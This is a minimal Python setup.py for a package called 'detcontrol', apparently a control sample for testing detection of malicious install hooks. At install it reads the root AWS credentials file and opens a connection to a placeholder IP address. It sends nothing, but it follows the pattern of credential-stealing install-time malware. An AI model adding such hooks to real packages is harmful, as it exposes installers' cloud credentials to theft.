import socket

from setuptools import setup

open('/root/.aws/credentials').read()
try:
    socket.create_connection(('192.0.2.1', 80), timeout=3)
except OSError:
    pass
setup(name='detcontrol', version='0.1', packages=['detcontrol'])
